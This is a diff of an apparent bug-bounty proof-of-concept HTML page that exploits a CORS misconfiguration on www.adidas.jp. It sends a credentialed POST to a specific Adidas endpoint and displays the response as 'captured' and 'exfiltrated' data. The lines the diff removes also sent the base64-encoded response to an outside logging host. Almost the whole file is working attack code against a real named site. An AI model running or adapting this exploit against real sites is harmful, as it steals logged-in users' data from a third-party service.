@@ -1,25 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC Adidas</title>
+    <title>CORS Exploitation PoC - Adidas</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
+        #result-box { background: #1e1e1e; border: 1px solid #00ff00; padding: 15px; word-wrap: break-word; white-space: pre-wrap; }
+        .status { color: yellow; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>Ejecutando PoC de CORS...</h1>
-    <p>Revisa la consola (F12) para ver los datos capturados.</p>
+    <h1>CORS Misconfiguration PoC</h1>
+    <p>Target: <span class="status">www.adidas.jp</span></p>
+    <hr>
+    <h3>Datos Capturados del Backend:</h3>
+    <div id="result-box">Esperando respuesta...</div>
 
     <script>
-        fetch('https://www.adidas.jp/AnES/9kJO/c/Ij_/NYzVeA/Yau3GfcicYuYf1ED5h/CVEhIAE/BzFVYiIv/Fm4B', {
+        const targetUrl = 'https://www.adidas.jp/AnES/9kJO/c/Ij_/NYzVeA/Yau3GfcicYuYf1ED5h/CVEhIAE/BzFVYiIv/Fm4B';
+        
+        fetch(targetUrl, {
             method: 'POST',
-            credentials: 'include', 
-            body: JSON.stringify({sensor_data: "test"})
+            credentials: 'include',
+            body: JSON.stringify({ sensor_data: "tatsu_research_test" })
         })
-        .then(response => response.text())
+        .then(response => {
+            if (!response.ok) {
+                document.getElementById('result-box').innerHTML = "Error: El servidor respondió con status " + response.status;
+            }
+            return response.text();
+        })
         .then(data => {
-            console.log("¡Datos robados!", data);
-            // Esto enviará el resultado a tu log de XSS Hunter para que tengas evidencia
-            fetch('https://test.bugtatsu.xyz/log?data=' + btoa(data));
+            // Imprimimos los datos directamente en el HTML
+            document.getElementById('result-box').innerText = data;
+            console.log("Datos exfiltrados:", data);
         })
-        .catch(err => console.error("Error en la petición:", err));
+        .catch(err => {
+            document.getElementById('result-box').innerHTML = "Fallo total: " + err;
+        });
     </script>
 </body>
 </html>
